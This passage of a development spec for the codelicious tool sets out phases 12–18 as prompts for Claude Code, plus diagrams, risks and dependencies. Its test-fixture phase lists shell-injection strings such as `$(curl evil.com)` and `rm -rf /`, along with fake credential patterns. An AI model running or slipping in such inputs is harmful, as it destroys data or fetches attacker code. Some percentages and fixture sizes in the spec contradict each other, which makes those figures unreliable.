1. test_timeout_precision: mock a hanging process, verify kill within 0.5s of timeout
2. test_process_group_kill: verify os.killpg is called, not just proc.kill
3. test_normal_completion: process that completes before timeout returns normally

Run `pytest tests/test_agent_runner.py -v`.
```

**Acceptance criteria:**
- No polling loop exists.
- Timeout is enforced via communicate().
- Process group is killed on timeout.

---

### Phase 12: Fix Test Collection Errors (test_scaffolder_v9.py, test_security_audit.py)

**What changes:**
Diagnose and fix import errors or fixture mismatches in the 3 test files that fail to collect.

**Files modified:**
- tests/test_scaffolder_v9.py (fix imports/fixtures)
- tests/test_security_audit.py (fix imports/fixtures)
- tests/test_verifier.py (already fixed in Phase 8, verify here)

**Intent:**
As the test suite, every test file must collect and run without errors. Zero collection errors is a
hard requirement for CI enforcement.

**Claude Code Prompt:**
```
Run `pytest tests/test_scaffolder_v9.py --collect-only 2>&1` to see the collection error.
Read the file and diagnose the issue (likely an import of a renamed/moved class or a missing
fixture).

Fix the import or fixture issue. Do not delete tests -- fix them so they run.

Repeat for tests/test_security_audit.py.

Verify tests/test_verifier.py (fixed in Phase 8) also collects cleanly.

Run `pytest tests/test_scaffolder_v9.py tests/test_security_audit.py tests/test_verifier.py -v`.
Run `pytest tests/ --collect-only` to verify zero collection errors across the entire suite.
```

**Acceptance criteria:**
- Zero collection errors across all test files.
- All previously passing tests still pass.
- Total test count is >= 564 (no tests removed).

---

### Phase 13: Add Tests for Untested Modules (config.py, budget_guard.py, _io.py, prompts.py, planner.py, scaffolder.py)

**What changes:**
Create dedicated test files for the 6 remaining untested modules (cli.py and agent_runner.py were
covered in Phases 1 and 5).

**Files modified:**
- tests/test_config.py (new, 8-10 tests)
- tests/test_budget_guard.py (new, 8-10 tests)
- tests/test_io.py (new, 5-8 tests)
- tests/test_prompts.py (new, 8-10 tests)
- tests/test_planner.py (new, 10-15 tests)
- tests/test_scaffolder_new.py (new, 8-10 tests for current scaffolder, not the v9 variant)

**Intent:**
As the test suite achieving 90%+ coverage, every source module must have dedicated tests covering
its public API, error paths, and edge cases. These modules were written in early specs (01-05) and
never received dedicated test files.

**Claude Code Prompt:**
```
For each module below, read the source file, identify all public functions and classes, then create
a test file exercising:
- Happy path for each public function
- Error/edge cases (invalid input, missing files, empty data)
- Boundary conditions (zero, max values, empty strings)

1. Read src/codelicious/config.py. Create tests/test_config.py.
   Test: loading valid config, missing config file, corrupted JSON, default values, permission error.

2. Read src/codelicious/budget_guard.py. Create tests/test_budget_guard.py.
   Test: budget initialization, token counting, budget exhaustion, budget reset, zero budget.

3. Read src/codelicious/_io.py. Create tests/test_io.py.
   Test: each utility function with valid and invalid inputs.

4. Read src/codelicious/prompts.py. Create tests/test_prompts.py.
   Test: each prompt template renders without errors, contains expected placeholders, handles
   missing variables gracefully.

5. Read src/codelicious/planner.py. Create tests/test_planner.py.
   Test: plan generation with valid spec, empty spec, malformed spec, spec with no requirements,
   task dependency ordering, plan serialization. Mock the LLM client for all tests.

6. Read src/codelicious/scaffolder.py. Create tests/test_scaffolder_new.py.
   Test: scaffold generation, file writing, directory creation, idempotent re-scaffolding,
   custom config, missing repo path.

Run `pytest tests/test_config.py tests/test_budget_guard.py tests/test_io.py tests/test_prompts.py tests/test_planner.py tests/test_scaffolder_new.py -v`.
```

**Acceptance criteria:**
- 6 new test files, each with 5-15 tests.
- All tests pass.
- Combined with existing tests, total count is 700+.

---

### Phase 14: Replace Magic Numbers with Named Constants

**What changes:**
Extract magic numbers into named constants across all source modules.

**Files modified:**
- src/codelicious/sandbox.py (MAX_FILE_SIZE, MAX_FILE_COUNT, etc.)
- src/codelicious/loop_controller.py (MAX_HISTORY_TOKENS already exists, verify others)
- src/codelicious/agent_runner.py (DEFAULT_TIMEOUT, MAX_PROMPT_LENGTH)
- src/codelicious/llm_client.py (MAX_RETRIES, RETRY_BACKOFF_BASE)
- src/codelicious/verifier.py (MAX_OUTPUT_SIZE, TIMEOUT values)
- src/codelicious/context_manager.py (TOKEN_ESTIMATE_RATIO)
- src/codelicious/build_logger.py (MAX_LOG_SIZE, LOG_PERMISSIONS)
- src/codelicious/fs_tools.py (MAX_DEPTH, MAX_ENTRIES)

**Intent:**
As a developer reading the codebase, every numeric literal should have a descriptive name that
explains its purpose. `MAX_FILE_SIZE = 1_048_576` is immediately clear; `1048576` on line 47 is not.

**Claude Code Prompt:**
```
Search all Python files in src/codelicious/ for numeric literals using:
ruff check src/codelicious/ --select PLR2004

For each magic number found:
1. Define a module-level constant with a descriptive ALL_CAPS name.
2. Replace the literal with the constant name.
3. Add a brief inline comment if the constant name alone is not self-explanatory.

Do NOT change any test files (tests may legitimately use literal numbers).
Do NOT change the values themselves, only give them names.

Run `ruff check src/codelicious/` and `pytest tests/ -v` to verify nothing broke.
```

**Acceptance criteria:**
- Zero magic number warnings from ruff PLR2004 rule in source code.
- All tests still pass.
- No behavioral changes.

---

### Phase 15: Configure Coverage Enforcement and Pre-Commit Hooks

**What changes:**
Configure pytest-cov for 90% minimum, add .pre-commit-config.yaml, update CI.

**Files modified:**
- pyproject.toml (~10 lines added for coverage config)
- .pre-commit-config.yaml (new file)
- .github/workflows/ci.yml (~10 lines added for coverage reporting)

**Intent:**
As a CI pipeline enforcing quality, every push and PR must measure line coverage and fail if below
90%. Developers must have pre-commit hooks that catch lint and format violations before they reach
CI.

**Claude Code Prompt:**
```
Read pyproject.toml. Add coverage configuration:

[tool.pytest.ini_options]
addopts = "--cov=src/codelicious --cov-report=term-missing --cov-fail-under=90"

Create .pre-commit-config.yaml:
repos:
  - repo: https://github.com/astral-sh/ruff-pre-commit
    rev: v0.4.0
    hooks:
      - id: ruff
        args: [--fix]
      - id: ruff-format

Read .github/workflows/ci.yml. Add coverage reporting to the test job:
- After pytest, add: `pytest tests/ -v --cov=src/codelicious --cov-report=term-missing --cov-fail-under=90`
- Add a coverage artifact upload step if desired.

Run `pytest tests/ -v --cov=src/codelicious --cov-report=term-missing` to measure current coverage.
If coverage is below 90%, identify the uncovered lines and note them for a follow-up patch in the
test files from Phase 13.

Run `ruff check src/ tests/` and `ruff format --check src/ tests/`.
```

**Acceptance criteria:**
- pytest-cov is configured in pyproject.toml.
- .pre-commit-config.yaml exists with ruff hooks.
- CI workflow includes coverage measurement.
- Current coverage is measured and documented.

---

### Phase 16: Generate Sample Test Fixtures and Dummy Data

**What changes:**
Create comprehensive test fixtures covering all edge cases.

**Files modified:**
- tests/fixtures/sample_config_valid.json (new)
- tests/fixtures/sample_config_corrupted.json (new)
- tests/fixtures/sample_config_oversized.json (new)
- tests/fixtures/sample_prompt_injection_spec.md (new)
- tests/fixtures/sample_large_directory.py (helper to generate large dir trees)
- tests/fixtures/sample_credentials.txt (new, contains fake credentials for redaction tests)
- tests/fixtures/sample_deep_nested.json (new, 150-level nested JSON)

**Intent:**
As the test suite validating edge cases, test fixtures must exist for every boundary condition
tested in this spec: oversized JSON, deeply nested JSON, prompt injection attempts, large directory
trees, and every credential type that should be redacted.

**Claude Code Prompt:**
```
Create the following test fixture files in tests/fixtures/:

1. sample_config_valid.json: a valid .codelicious/config.json with all fields populated.
2. sample_config_corrupted.json: invalid JSON (truncated mid-object).
3. sample_config_oversized.json: a script comment explaining this should be generated at test
   runtime (not a 20 MB file in git). Include a Python snippet to generate it.
4. sample_prompt_injection_spec.md: a markdown spec containing shell injection attempts:
   - `"; rm -rf /; "`
   - `$(curl evil.com)`
   - `--dangerously-skip-permissions`
   - Lines with null bytes and control characters
5. sample_credentials.txt: fake credentials for every type the redactor should catch:
   - sk-abc123... (OpenAI)
   - ghp_abc123... (GitHub)
   - AKIAIOSFODNN7EXAMPLE (AWS)
   - xoxb-123-456-abc (Slack)
   - sk_live_abc123... (Stripe)
   - AC + 32 hex chars (Twilio)
   - npm_abc123... (NPM)
   - -----BEGIN RSA PRIVATE KEY----- (SSH)
   - Bearer eyJ... (JWT)
6. sample_deep_nested.json: exactly 100 levels of nesting (at the limit, should parse).

Run `pytest tests/ --collect-only` to verify fixtures do not break collection.
```

**Acceptance criteria:**
- All fixture files exist and are valid for their purpose.
- No test collection errors from fixtures.
- Each fixture is used by at least one test from Phases 1-13.

---

### Phase 17: Update Documentation (STATE.md, README.md, CLAUDE.md)

**What changes:**
Update all documentation to reflect the final state after all phases are complete.

**Files modified:**
- .codelicious/STATE.md (full rewrite of current status)
- README.md (update metrics, add new Mermaid diagrams)
- CLAUDE.md (update rules if needed)

**Intent:**
As a developer reading the documentation, every metric, diagram, and status entry must reflect the
actual current state of the codebase after spec-17 is complete.

**Claude Code Prompt:**
```
Read .codelicious/STATE.md. Update it with:
- Current spec: spec-17
- Status: VERIFIED GREEN
- All P1 findings: FIXED (list each with the phase that fixed it)
- All P2 findings: FIXED (list each with the phase that fixed it)
- Test count: actual count from pytest output
- Coverage: actual percentage from pytest-cov output
- All spec-17 phases marked as complete

Read README.md. Update:
- Test count in any metrics mentioned
- Add a "Quality Metrics" section if not present, showing: tests, coverage, lint, security status
- Verify all existing Mermaid diagrams still render correctly
- Add the new Mermaid diagrams specified in Section 6 of this spec

Read CLAUDE.md. Verify the rules still match the actual project conventions. Update if any rules
have changed (e.g., if pre-commit hooks are now required).

Run `ruff format --check README.md CLAUDE.md` (if applicable) and verify no broken markdown links.
```

**Acceptance criteria:**
- STATE.md reflects zero open P1/P2 findings.
- README.md metrics match actual test/coverage output.
- All Mermaid diagrams render correctly.
- No stale or incorrect information in documentation.

---

### Phase 18: Final Verification and Sign-Off

**What changes:**
Run the complete verification pipeline and document the results.

**Files modified:**
- .codelicious/STATE.md (final metrics update)
- .codelicious/BUILD_COMPLETE (write "DONE")

**Intent:**
As the final quality gate, every check must pass in a single clean run with no retries, no skips,
and no expected failures.

**Claude Code Prompt:**
```
Run the following commands in sequence and capture all output:

1. ruff check src/ tests/
2. ruff format --check src/ tests/
3. pytest tests/ -v --tb=short --cov=src/codelicious --cov-report=term-missing --cov-fail-under=90
4. bandit -r src/codelicious/ -s B101,B603,B404,B602,B607,B110
5. pip-audit --desc

All 5 must pass with zero errors, zero warnings (except bandit exemptions), zero failures.

If any check fails:
- Do not retry blindly. Read the error, diagnose the root cause, fix it, and re-run.
- Document any fixes made in this phase.

When all pass:
- Update STATE.md with final metrics.
- Write "DONE" to .codelicious/BUILD_COMPLETE.
```

**Acceptance criteria:**
- Lint: zero violations
- Format: zero violations
- Tests: 700+ passing, zero failures, zero collection errors
- Coverage: 90%+ line coverage
- Security: zero findings (with documented exemptions only)
- Dependencies: zero known vulnerabilities
- BUILD_COMPLETE contains "DONE"

---

## 5. Acceptance Criteria Summary

| ID | Criterion | Phase | Verification |
|----|-----------|-------|--------------|
| AC-01 | Zero P1 critical findings | 1-5, 11 | STATE.md shows all P1 FIXED |
| AC-02 | Zero P2 important findings | 6-9, 11 | STATE.md shows all P2 FIXED |
| AC-03 | Zero test collection errors | 8, 12 | `pytest --collect-only` returns 0 |
| AC-04 | 700+ tests passing | 1-13 | `pytest` shows 700+ passed |
| AC-05 | 90%+ line coverage | 15 | `pytest --cov-fail-under=90` passes |
| AC-06 | Zero lint violations | 14 | `ruff check` returns 0 |
| AC-07 | Zero format violations | 14 | `ruff format --check` returns 0 |
| AC-08 | Zero security findings | 9 | `bandit` returns 0 (with exemptions) |
| AC-09 | Pre-commit hooks configured | 15 | .pre-commit-config.yaml exists |
| AC-10 | All documentation current | 17 | Manual review of STATE.md, README.md |
| AC-11 | No magic numbers in source | 14 | `ruff --select PLR2004` returns 0 |
| AC-12 | All credentials redacted | 9 | Dedicated tests for each pattern pass |
| AC-13 | BUILD_COMPLETE written | 18 | File contains "DONE" |

---

## 6. System Design Diagrams

The following Mermaid diagrams should be added to README.md to visualize the changes in this spec.

### 6.1 Spec-17 Security Finding Resolution Flow

```mermaid
flowchart TB
    subgraph P1["P1 Critical (6 Findings)"]
        P14["P1-4: File count race"]
        P15["P1-5: Overwrite count bug"]
        P16["P1-6: Symlink TOCTOU"]
        P18["P1-8: Silent exception"]
        P19["P1-9: JSON deser DoS"]
        P111["P1-11: Prompt injection"]
    end

    subgraph P2["P2 Important (11 Findings)"]
        P25["P2-5: Dir listing DoS"]
        P26["P2-6: mkdir race"]
        P27["P2-7: Silent chmod"]
        P28["P2-8: Verifier injection"]
        P29["P2-9: Secret detection gaps"]
        P210["P2-10: Timeout overrun"]
        P211["P2-11: Regex backtrack"]
        P212["P2-12: Log file perms"]
        P213["P2-13: Incomplete redaction"]
        P2N1["P2-NEW-1: Git push timeout"]
        P2N2["P2-NEW-2: Verifier proc group"]
    end

    subgraph Phases["Implementation Phases"]
        Ph1["Phase 1: cli.py"]
        Ph2["Phase 2: sandbox count"]
        Ph3["Phase 3: sandbox symlink"]
        Ph4["Phase 4: JSON limits"]
        Ph5["Phase 5: prompt sanitize"]
        Ph6["Phase 6: dir limits"]
        Ph7["Phase 7: race fixes"]
        Ph8["Phase 8: verifier + git"]
        Ph9["Phase 9: credentials"]
        Ph10["Phase 10: regex fix"]
        Ph11["Phase 11: timeout fix"]
    end

    P18 --> Ph1
    P14 --> Ph2
    P15 --> Ph2
    P16 --> Ph3
    P19 --> Ph4
    P111 --> Ph5
    P25 --> Ph6
    P26 --> Ph7
    P27 --> Ph7
    P212 --> Ph7
    P28 --> Ph8
    P2N1 --> Ph8
    P2N2 --> Ph8
    P29 --> Ph9
    P213 --> Ph9
    P211 --> Ph10
    P210 --> Ph11

    Ph1 & Ph2 & Ph3 & Ph4 & Ph5 & Ph6 & Ph7 & Ph8 & Ph9 & Ph10 & Ph11 --> ZeroFindings["Zero Open Findings"]

    style P1 fill:#DC143C,color:#fff
    style P2 fill:#DAA520,color:#000
    style ZeroFindings fill:#228B22,color:#fff
```

### 6.2 Spec-17 Test Coverage Expansion

```mermaid
block-beta
    columns 6
    block:existing:6
        sandbox["sandbox.py\n50+ tests"]:1
        verifier["verifier.py\n60+ tests"]:1
        executor["executor.py\n48+ tests"]:1
        cmd_runner["command_runner\n195+ tests"]:1
        parser["parser.py\n31 tests"]:1
        context_mgr["context_mgr\n35+ tests"]:1
    end
    block:existing2:6
        fs_tools["fs_tools.py\n31+ tests"]:1
        security["security_audit\n35+ tests"]:1
        llm_client["llm_client\n17 tests"]:1
        cache["cache_engine\n16 tests"]:1
        git_orch["git_orchestrator\n18+ tests"]:1
        logger["logger.py\n15+ tests"]:1
    end
    block:new:6
        cli["cli.py\n8+ tests\nNEW"]:1
        agent["agent_runner\n13+ tests\nNEW"]:1
        planner["planner.py\n15+ tests\nNEW"]:1
        config["config.py\n10+ tests\nNEW"]:1
        budget["budget_guard\n10+ tests\nNEW"]:1
        prompts["prompts.py\n10+ tests\nNEW"]:1
    end

    style existing fill:#228B22,color:#fff
    style existing2 fill:#228B22,color:#fff
    style new fill:#4169E1,color:#fff
```

### 6.3 Spec-17 Atomic File Write Sequence (Post-Fix)

```mermaid
sequenceDiagram
    participant Thread as Worker Thread
    participant Lock as Sandbox Lock
    participant Set as Written Paths Set
    participant Counter as File Counter
    participant FS as Filesystem
    participant Check as Post-Write Check

    Thread->>Lock: acquire()
    Lock-->>Thread: granted

    Thread->>Set: path in _written_paths?
    alt New file
        Set-->>Thread: No (new file)
        Thread->>Counter: count < max_files?
        alt Under limit
            Counter-->>Thread: Yes
            Counter->>Counter: increment
            Set->>Set: add(path)
            Thread->>FS: tempfile.write(content)
            Thread->>FS: os.replace(temp, target)
            alt Write fails
                FS-->>Thread: OSError
                Counter->>Counter: decrement
                Set->>Set: remove(path)
                Thread->>Lock: release()
                Thread-->>Thread: raise FileWriteError
            else Write succeeds
                FS-->>Thread: OK
                Thread->>Check: os.lstat(target)
                alt Symlink detected
                    Check-->>Thread: is_symlink=True
                    Thread->>FS: os.unlink(target)
                    Counter->>Counter: decrement
                    Set->>Set: remove(path)
                    Thread->>Lock: release()
                    Thread-->>Thread: raise SandboxViolationError
                else Normal file
                    Check-->>Thread: is_symlink=False
                    Thread->>Lock: release()
                    Thread-->>Thread: return success
                end
            end
        else Over limit
            Counter-->>Thread: No (at max)
            Thread->>Lock: release()
            Thread-->>Thread: raise FileCountLimitError
        end
    else Existing file (overwrite)
        Set-->>Thread: Yes (overwrite)
        Thread->>FS: tempfile.write(content)
        Thread->>FS: os.replace(temp, target)
        Thread->>Check: os.lstat(target)
        Check-->>Thread: is_symlink=False
        Thread->>Lock: release()
        Thread-->>Thread: return success
    end
```

### 6.4 Credential Redaction Coverage Map

```mermaid
flowchart LR
    subgraph Existing["Existing Patterns (Pre-Spec-17)"]
        E1["OpenAI (sk-)"]
        E2["GitHub (ghp_, gho_, ghu_, ghs_, ghr_)"]
        E3["AWS (AKIA, ABIA, ACCA, ASIA)"]
        E4["Anthropic (sk-ant-)"]
        E5["JWT (eyJ...)"]
        E6["Database URLs"]
        E7["Bearer tokens"]
        E8["Azure credentials"]
        E9["GCP service accounts"]
        E10["HuggingFace (hf_)"]
    end

    subgraph New["New Patterns (Spec-17 Phase 9)"]
        N1["SSH Private Keys"]
        N2["NPM Tokens (npm_)"]
        N3["Slack (xoxb-, xoxp-, xoxs-, xoxa-)"]
        N4["Stripe (sk_live_, pk_live_, rk_live_)"]
        N5["Twilio (AC, SK + 32 hex)"]
        N6["Webhook URLs with tokens"]
    end

    Existing --> Redactor["sanitize_message()"]
    New --> Redactor
    Redactor --> Safe["Safe Log Output\n(all credentials replaced\nwith ***REDACTED***)"]

    style Existing fill:#228B22,color:#fff
    style New fill:#4169E1,color:#fff
    style Safe fill:#228B22,color:#fff
```

---

## 7. Risk Assessment

### Implementation Risks

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Sandbox lock changes cause deadlock | Low | High | Each phase has rollback tests; lock acquisition is always in the same order |
| Regex replacement breaks code extraction | Medium | High | Existing test suite covers all normal cases; pathological test added |
| Test collection fixes break existing tests | Low | Medium | Run full suite after each fix; never delete tests |
| Coverage target of 90% not achievable | Low | Medium | Phase 13 adds 60+ tests for untested modules; target is realistic |
| Pre-commit hooks slow down development | Low | Low | Ruff is fast (sub-second); hooks are optional for emergency commits |

### Rollback Strategy

Each phase is independent. If a phase introduces a regression:
1. Revert the phase's changes (single commit per phase).
2. Re-run the full test suite to confirm green.
3. Investigate the root cause before re-attempting.

No phase modifies the database schema, API contracts, or public CLI interface. All changes are
internal quality improvements.

---

## 8. Dependencies Between Phases

```
Phase 1 (cli.py P1-8)           -- independent, start immediately
Phase 2 (sandbox count P1-4/5)  -- independent
Phase 3 (sandbox symlink P1-6)  -- depends on Phase 2 (same file, counter logic)
Phase 4 (JSON limits P1-9)      -- independent
Phase 5 (prompt sanitize P1-11) -- independent
Phase 6 (dir limits P2-5)       -- independent
Phase 7 (race fixes P2-6/7/12)  -- depends on Phase 2 (same file)
Phase 8 (verifier P2-8/NEW-1/2) -- independent
Phase 9 (credentials P2-9/13)   -- independent
Phase 10 (regex P2-11)          -- independent
Phase 11 (timeout P2-10)        -- depends on Phase 5 (same file)
Phase 12 (collection errors)    -- depends on Phase 8 (verifier tests)
Phase 13 (untested modules)     -- depends on Phases 1, 5 (cli, agent_runner tests exist)
Phase 14 (magic numbers)        -- depends on all code changes (Phases 1-11)
Phase 15 (coverage + hooks)     -- depends on Phase 13 (tests must exist first)
Phase 16 (fixtures)             -- depends on Phases 4, 5, 9 (fixtures support those tests)
Phase 17 (documentation)        -- depends on all phases (reflects final state)
Phase 18 (final verification)   -- depends on all phases
```

Parallelizable groups:
- Group A (immediate): Phases 1, 2, 4, 5, 6, 8, 9, 10
- Group B (after Phase 2): Phases 3, 7
- Group C (after Phase 5): Phase 11
- Group D (after Group A+B+C): Phase 12
- Group E (after Phase 12): Phase 13
- Group F (after all code): Phase 14
- Group G (after Phase 13): Phase 15, 16
- Group H (final): Phase 17, 18

---

## 9. Quick Install and Verification Instructions

### For Developers Working on This Spec

```bash
# Clone and setup
git clone https://github.com/clay-good/codelicious.git
cd codelicious
git checkout codelicious/auto-build
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"

# Verify current state before starting
pytest tests/ -v --tb=short                    # All tests pass
ruff check src/ tests/                          # Zero violations
ruff format --check src/ tests/                 # Zero violations
bandit -r src/codelicious/ -s B101,B603,B404,B602,B607,B110  # Zero findings

# After implementing each phase
pytest tests/ -v --tb=short                    # All tests still pass
ruff check src/ tests/                          # Zero violations

# After all phases complete
pytest tests/ -v --cov=src/codelicious --cov-report=term-missing --cov-fail-under=90
```

### For End Users

```bash
pip install -e .
codelicious /path/to/your/repo --push-pr
```

No changes to the end-user install or CLI interface.

---

## 10. Deterministic vs Probabilistic Logic Analysis

### Current State (Post-Spec-16, Pre-Spec-17)

| Layer | Module Count | Estimated Lines | Character |
|-------|-------------|-----------------|-----------|
| Deterministic (10%) | 12 modules | ~3,800 | Validates, blocks, logs, enforces limits. Never calls LLM. |
| Probabilistic (90%) | 12 modules | ~3,600 | Plans, generates code, makes decisions via LLM. |
| Shared infrastructure | 6 modules | ~1,050 | Config, errors, CLI, git ops. Deterministic but not security-critical. |

### Deterministic Layer Modules (Safety Harness)

| Module | Lines | Role |
|--------|-------|------|
| sandbox.py | 400 | Filesystem access control, path validation, file limits |
| verifier.py | 800 | Syntax check, test runner, lint, security scanner |
| command_runner.py | 159 | Command denylist, metacharacter filter, shell=False |
| fs_tools.py | 130 | Sandboxed read/write/list operations |
| audit_logger.py | 100 | Security event logging |
| security_constants.py | 96 | Immutable denylist and metacharacter sets |
| logger.py | 207 | Credential redaction, structured logging |
| build_logger.py | 200 | Build event logging with permissions |
| errors.py | 200 | 48 typed exception classes |
| budget_guard.py | 100 | Token/cost budget enforcement |
| progress.py | 100 | Build progress state machine |
| _io.py | 50 | Safe I/O utilities |

### Probabilistic Layer Modules (LLM-Driven)

| Module | Lines | Role |
|--------|-------|------|
| planner.py | 400 | LLM generates task plans from specs |
| executor.py | 250 | LLM generates code, extracts file content |
| llm_client.py | 150 | HTTP client for HuggingFace API |
| loop_controller.py | 218 | Agentic loop, message history management |
| agent_runner.py | 340 | Claude subprocess management, stream parsing |
| prompts.py | 500 | All prompt templates (consumed by LLM) |
| context_manager.py | 200 | Token estimation, prompt assembly |
| rag_engine.py | 150 | Vector search for code context |
| engines/claude_engine.py | 350 | 6-phase Claude lifecycle |
| engines/huggingface_engine.py | 200 | HuggingFace agentic loop |
| engines/base.py | 61 | Abstract engine interface |
| engines/__init__.py | 50 | Engine selection logic |

### Post-Spec-17 Projection

The deterministic layer grows by approximately 150 lines (tighter validation, new redaction
patterns, size limits). The probabilistic layer stays constant (no new LLM features). The net
effect is the deterministic safety harness increases from 44% to approximately 45% of total source
lines.

| Category | Pre-Spec-17 | Post-Spec-17 | Delta |
|----------|------------|-------------|-------|
| Deterministic | ~3,800 (44%) | ~3,950 (45%) | +150 lines |
| Probabilistic | ~3,600 (41%) | ~3,600 (41%) | 0 lines |
| Infrastructure | ~1,050 (15%) | ~1,250 (14%) | +200 lines (new tests, fixtures) |

---

## 11. Glossary

- TOCTOU: Time-of-check to time-of-use. A race condition where the state changes between when a
  condition is checked and when the result is acted upon.
- ReDoS: Regular expression denial of service. Caused by patterns with exponential backtracking.
- Process group: A set of related processes (parent + children) that can be signaled together via
  os.killpg.
- Atomic write: A write operation that either completes fully or has no effect. Implemented via
  write-to-temp then os.replace.
- Denylist: A list of explicitly prohibited items (commands, characters). Everything not on the
  list is allowed.
- Allowlist: A list of explicitly permitted items (file extensions). Everything not on the list is
  blocked.
- Redaction: Replacing sensitive data (credentials, keys) with a placeholder before logging or
  displaying.

---

## 12. Changelog

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0.0 | 2026-03-19 | Claude Opus 4.6 | Initial draft |
